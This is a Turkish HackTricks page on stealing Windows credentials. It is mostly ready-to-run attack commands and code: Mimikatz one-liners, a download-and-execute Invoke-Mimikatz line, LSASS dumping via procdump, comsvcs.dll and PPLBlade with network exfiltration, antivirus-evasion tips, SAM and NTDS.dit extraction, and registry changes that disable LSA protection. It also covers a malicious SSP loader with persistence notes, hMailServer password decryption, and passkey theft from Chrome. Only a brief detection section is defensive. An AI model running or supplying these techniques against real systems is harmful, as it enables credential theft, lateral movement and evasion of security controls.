# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz Kimlik Bilgileri
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabildiği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Olası kimlik bilgileri korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Victim içindeki **parolaları ve hash'leri aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i **kullanın**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

**SysInternals'tan Procdump meşru bir Microsoft aracı olduğu için**, [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) tarafından sağlanan **Procdump Defender tarafından tespit edilmez**.\
Bu aracı **lsass process'inin dump'ını almak**, **dump'ı indirmek** ve **credentials'ları dump'tan lokal olarak extract etmek** için kullanabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** yazılımları, **lsass.exe**'yi dump etmek için **procdump.exe** kullanılmasını **malicious** olarak **detect** edebilir; bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **detect** etmeleridir. Bu nedenle, **procdump**'a **lsass.exe adını** vermek **yerine**, lsass.exe'nin **PID** değerini **argument** olarak geçirmek daha **stealthier** bir yöntemdir.

### **comsvcs.dll** ile lsass dump etme

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı DLL, bir crash durumunda **process memory dump** etmekten sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **function** içerir.\
İlk iki argument'i kullanmak gereksizdir; ancak üçüncü argument üç bileşene ayrılır. Dump edilecek process'in ID'si ilk bileşeni, dump file konumu ikinci bileşeni, üçüncü bileşen ise kesinlikle **full** kelimesini oluşturur. Alternatif bir seçenek mevcut değildir.\
Bu üç bileşen parse edildikten sonra DLL, dump file oluşturur ve belirtilen process'in memory'sini bu file'a aktarır.\
**comsvcs.dll** kullanılarak lsass process'ini dump etmek mümkündür; böylece procdump'ı upload edip execute etmeye gerek kalmaz. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.

Execution için aşağıdaki command kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dump etme**

1. Görev Çubuğuna sağ tıklayın ve Task Manager'a tıklayın
2. Daha fazla ayrıntı'ya tıklayın
3. Processes sekmesinde "Local Security Authority Process" process'ini arayın
4. "Local Security Authority Process" process'ine sağ tıklayın ve "Create dump file"a tıklayın.

### procdump ile lsass dump etme

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan ve Microsoft tarafından imzalanmış bir binary'dir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass Dump Etme

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), memory dump'ı obfuscate etmeyi ve diske yazmadan remote workstation'lara aktarmayı destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını bypass etme
2. Defender'ın signature-based detection mekanizmalarından kaçınmak için memory dump dosyalarını obfuscate etme
3. Memory dump'ı diske yazmadan (fileless dump), RAW ve SMB upload yöntemleriyle yükleme
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump olmadan SSP tabanlı LSASS dumping

Ink Dragon, `MiniDumpWriteDump` fonksiyonunu hiç çağırmayan ve bu nedenle EDR'nin bu API üzerindeki hook'larının hiç tetiklenmediği üç aşamalı bir dumper olan **LalsDumper**'ı kullanıma sunar:<sup>[[3]](#references)</sup>

1. **Aşama 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir placeholder arar, bunu `rtu.txt` dosyasının absolute path'i ile değiştirir, yamalanmış DLL'yi `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu işlem **LSASS**'ı kötü amaçlı DLL'yi yeni bir Security Support Provider (SSP) olarak yüklemeye zorlar.
2. **LSASS içindeki Aşama 2** – LSASS `nfdp.dll` dosyasını yüklediğinde DLL, `rtu.txt` dosyasını okur, her byte'ı `0x20` ile XOR'lar ve decode edilmiş blob'u execution'ı devretmeden önce memory'ye map eder.
3. **Aşama 3 dumper** – Map edilmiş payload, hashed API name'lerden (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) çözümlenen **direct syscalls** kullanarak MiniDump mantığını yeniden uygular. `Tom` adlı özel bir export, `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dump'ını dosyaya stream eder ve exfiltration işleminin daha sonra yapılabilmesi için handle'ı kapatır.

Operator notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı directory içinde tutun. Aşama 1, hard-coded placeholder'ı `rtu.txt` dosyasının absolute path'i ile yeniden yazar; bu nedenle dosyaları ayırmak chain'i bozar.
* Registration, `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` değerine `nfdp` eklenerek yapılır. LSASS'ın her boot sırasında SSP'yi yeniden yüklemesini sağlamak için bu değeri kendiniz seed edebilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dump'lardır. Bunları local olarak decompress edin, ardından credential extraction için Mimikatz/Volatility'ye aktarın.
* `lals.exe` çalıştırıldığında `AddSecurityPackageA` fonksiyonunun başarılı olması için admin/SeTcb hakları gerekir; çağrı döndüğünde LSASS rogue SSP'yi transparently yükler ve Aşama 2'yi çalıştırır.
* DLL'nin diskten kaldırılması onu LSASS'tan çıkarmaz. Registry entry'sini silip LSASS'ı restart edin (reboot) veya long-term persistence için bırakın.

## CrackMapExec

### Dump SAM hash'leri
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets'lerini Dump Etme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit Dump Etme
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit password history dump'ı
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM Verilerini Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumlarında **bulunmalıdır.** Ancak **korundukları için** bunları normal bir şekilde kopyalayamazsınız.

### Registry'den

Bu dosyaları çalmanın en kolay yolu, Registry'den bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**İndirin** bu dosyaları Kali makinenize ve şu komutu kullanarak **hash'leri çıkarın**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu servisi kullanarak korunan dosyaların kopyasını oluşturabilirsiniz. Administrator olmanız gerekir.

#### vssadmin Kullanarak

vssadmin binary'si yalnızca Windows Server sürümlerinde kullanılabilir.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ancak aynı işlemi **Powershell** üzerinden de yapabilirsiniz. Bu, **SAM dosyasının nasıl kopyalanacağını** gösteren bir örnektir (kullanılan sabit disk "C:" ve dosya C:\users\Public konumuna kaydedilir); ancak bunu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) de kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve user object'leri, gruplar ve bunların üyelikleri hakkında kritik verileri içerir. Domain user'ları için **password hash**'leri burada saklanır. Bu dosya bir **Extensible Storage Engine (ESE)** database'idir ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu database içinde üç temel tablo tutulur:

- **Data Table**: User ve group gibi object'ler hakkındaki bilgileri depolamakla görevlidir.
- **Link Table**: Group üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her object için **security descriptor**'lar burada tutulur; böylece depolanan object'lerin güvenliği ve access control'ü sağlanır.

Bunun hakkında daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows, bu dosyayla etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının **bir kısmı `lsass`** memory'si içinde bulunabilir (performans artışı için **cache** kullanılması nedeniyle muhtemelen en son erişilen verileri bulabilirsiniz).

#### NTDS.dit içindeki hash'leri Decrypting

Hash 3 kez cypher edilir:

1. Password Encryption Key'i (**PEK**) **BOOTKEY** ve **RC4** kullanarak decrypt edin.
2. **Hash**'i **PEK** ve **RC4** kullanarak decrypt edin.
3. **Hash**'i **DES** kullanarak decrypt edin.

**PEK**, **her domain controller'da** aynı değere sahiptir, ancak **domain controller'ın SYSTEM file'ındaki BOOTKEY** kullanılarak **NTDS.dit** dosyası içinde cypher edilir (domain controller'lar arasında farklıdır). Bu nedenle NTDS.dit dosyasından credentials'ları almak için **NTDS.dit** ve **SYSTEM** dosyalarına (_C:\Windows\System32\config\SYSTEM_) ihtiyacınız vardır.

### Ntdsutil kullanarak NTDS.dit'i Copying

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
**volume shadow copy** trick to copy the **ntds.dit** file'ını da kullanabilirsiniz. Ayrıca **SYSTEM file**'ın bir kopyasına da ihtiyacınız olacağını unutmayın (yine, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit'ten hash'leri çıkarma**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, **hash'leri çıkarmak** için _secretsdump.py_ gibi araçları kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Bunları geçerli bir domain admin kullanıcısı kullanarak **otomatik olarak da çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**büyük NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.

Son olarak, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` da kullanılabilir.

### **NTDS.dit dosyasından domain objects öğelerini SQLite database'e çıkarma**

NTDS objects, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite database'e çıkarılabilir. Yalnızca secrets çıkarılmaz; ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkarmak amacıyla tüm objects ve bunların attributes öğeleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive isteğe bağlıdır ancak secrets decryption için gereklidir (NT ve LM hashes, cleartext passwords gibi supplemental credentials, kerberos veya trust keys, NT ve LM password histories). Diğer bilgilerin yanı sıra aşağıdaki veriler de çıkarılır: hash'leriyle birlikte user ve machine accounts, UAC flags, last logon ve password change timestamp'leri, accounts description'ları, names, UPN, SPN, groups ve recursive memberships, organizational units tree ve membership, trust type, direction ve attributes bilgileriyle trusted domains...

## Lazagne

Binary'yi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'yi çeşitli software'lerden credentials çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar

### Windows Credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirin: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Şuradan indirin:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**; parolalar çıkarılacaktır.

## Boşta olan RDP oturumlarını tarama ve security kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT’i, her red-teamer için kullanışlı teknikler içeren bir `DumpRDPHistory` tasker’ı barındırır:<sup>[[3]](#references)</sup>

### DumpRDPHistory tarzı telemetry toplama

* **Outbound RDP hedefleri** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumundaki her user hive’ını ayrıştırın. Her subkey server adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’ın mantığını PowerShell ile taklit edebilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP kanıtları** – kutuyu kimin yönettiğini belirlemek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log’unu Event ID’leri **21** (başarılı logon) ve **25** (disconnect) açısından sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendikten sonra, **disconnected** oturumu hâlâ mevcutken LSASS’ı (LalsDumper/Mimikatz ile) dump edin. CredSSP + NTLM fallback, verifier’larını ve token’larını LSASS’ta bırakır; bunlar daha sonra SMB/WinRM üzerinden replay edilerek `NTDS.dit` alınabilir veya domain controller’larda persistence oluşturulabilir.

### FinalDraft tarafından hedeflenen Registry downgrade’leri

Aynı implant, credential theft’i kolaylaştırmak için çeşitli registry key’lerini de değiştirir:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarlamak, RDP sırasında tam kimlik bilgisi/ticket yeniden kullanımını zorunlu kılar ve pass-the-hash tarzı pivot'ları etkinleştirir.
* `LocalAccountTokenFilterPolicy=1`, UAC token filtrelemesini devre dışı bırakarak local admin'lerin ağ üzerinden kısıtlanmamış token'lar almasını sağlar.
* `DSRMAdminLogonBehavior=2`, DC çevrimiçiyken DSRM administrator hesabının oturum açmasına izin vererek saldırganlara başka bir yerleşik yüksek ayrıcalıklı hesap sunar.
* `RunAsPPL=0`, LSASS PPL korumalarını kaldırır ve LalsDumper gibi dumper'lar için memory erişimini önemsiz hale getirir.

## hMailServer veritabanı kimlik bilgileri (post-compromise)

hMailServer, DB password değerini `[Database] Password=` altında `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında saklar. Değer, statik `THIS_KEY_IS_NOT_SECRET` anahtarı ve 4-byte word endianness swap'leri kullanılarak Blowfish ile şifrelenir. INI'deki hex string'i şu Python snippet'iyle kullanın:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Düz metin parolayla, dosya kilitlerini önlemek için SQL CE veritabanını kopyalayın, 32-bit provider'ı yükleyin ve hash'leri sorgulamadan önce gerekirse upgrade edin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu, hMailServer hash formatını (hashcat mode `1421`) kullanır. Bu değerleri crack etmek, WinRM/SSH pivot'ları için yeniden kullanılabilir kimlik bilgileri sağlayabilir.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Bazı tooling, LSA logon callback `LsaApLogonUserEx2`'yi intercept ederek **plaintext logon password** yakalar. Amaç, authentication package callback'i hook'lamak veya wrap etmektir; böylece credentials **logon sırasında** (hashing işleminden önce) yakalanır, ardından diske yazılır veya operatöre döndürülür. Bu işlem genellikle LSA'ya inject olan veya LSA'ya register olan ve her başarılı interactive/network logon event'ini username, domain ve password ile kaydeden bir helper ile uygulanır.<sup>[[1]](#references)</sup>

Operational notes:
- Helper'ı authentication path'e yüklemek için local admin/SYSTEM gerekir.
- Captured credentials yalnızca bir logon gerçekleştiğinde görünür (hook'a bağlı olarak interactive, RDP, service veya network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), kayıtlı connection bilgilerini kullanıcı başına oluşturulan bir `sqlstudio.bin` dosyasında saklar. Dedicated dumper'lar dosyayı parse ederek kayıtlı SQL credentials'larını kurtarabilir. Yalnızca command output döndüren shell'lerde dosya genellikle Base64 olarak encode edilip stdout'a yazdırılarak exfiltrate edilir.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Operatör tarafında dosyayı yeniden oluşturun ve kimlik bilgilerini kurtarmak için dumper'ı yerel olarak çalıştırın:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Chrome on Windows'tan Passkeys / WebAuthn credential çalma

Windows host üzerinde **victim user** olarak, **Chrome + Google Password Manager ile senkronize edilmiş passkeys** kullanılarak code execution elde edilirse, admin/SYSTEM olmadan bile passkeys ilginç bir post-exploitation hedefi haline gelir.<sup>[[4]](#references)</sup>

### İlginç yerel artefaktlar
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**, protobuf ile encode edilmiş **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir process, senkronize edilmiş passkey'ler için **RP ID**, **username**, **credential ID** ve şifrelenmiş private-key materyalini enumerate edebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve senkronize edilmiş credential'ları kurtarmak için kullanılan wrapped secret gibi yerel device-enrollment durumunu depolar.<sup>[[4]](#references)</sup>

Hızlı triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM'e bağlı anahtar blob'ları yine de yerel bir imzalama oracle'ı olarak kötüye kullanılabilir

Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği bir durumda saklarsa, malware'in ham özel anahtarı çıkarması gerekmez. Blob'u **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın kontrolündeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Bu, **hardware binding'in cihaz dışına aktarımı engellediği, ancak ele geçirilmiş endpoint üzerinde aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.

### Pratik kötüye kullanım yolları

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` kayıtlarını enumerate edin.
- Bir passkey login başlatın ve yeni bir WebAuthn challenge alın.
- Çalınan `wrapped_identity_private_key` blob'unu victim TPM üzerinde kullanarak cloud-authenticator request binding'i imzalayın.
- Döndürülen assertion'ı relying party'ye relay edin.
- Bu, özellikle RP `userVerification=preferred` kabul ettiğinde veya **`UV=0`** olan assertion'ları reddetmediğinde değerlidir.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` dosyasını silerek veya geçerli imzalı bir `device/forget` operation göndererek yeniden onboarding'i zorlayın.
- Onboarding cihazı **`uv_key_pending`** durumunda bırakırsa attacker tarafından kontrol edilen bir UV public key register edin.
- Provider yeni UV key için attestation / secure-hardware origin doğrulaması yapmıyorsa, attacker key'den gelen sonraki signature'lar **`UV=1`** olarak değerlendirilir.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Chrome'un synced-passkey master secret'ı fetch etmesi için recovery veya rejoin'i zorlayın.
- `passkey_enclave_state` dosyasının yeniden oluşturulmasını/değiştirilmesini izleyin, ardından plaintext **security domain secret (SDS)** bellekte bulunurken Chrome memory dump alın.
- Her `WebauthnCredentialSpecifics` kaydındaki encrypted field'ları decrypt etmek ve portable WebAuthn private key'leri kurtarmak için elde edilen SDS'yi kullanın.

### DFIR / detection fikirleri

- **`passkey_enclave_state` dosyasının silinmesini/yeniden oluşturulmasını** monitor edin.<sup>[[4]](#references)</sup>
- Browser olmayan process'lerin Chrome **`Sync Data\LevelDB`** erişimi için alert oluşturun.
- **Chrome memory dump'ları** veya şüpheli cross-process memory access için alert oluşturun.
- Tekrarlanan **Google Password Manager recovery PIN** prompt'larını veya beklenmeyen yeniden onboarding'i investigate edin.
- WebAuthn **`signCount`** değerinin synced passkey'lerde çoğu zaman kullanışlı olmadığını unutmayın; değer sabit kalabilir, bu nedenle klasik clone detection zayıftır.

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
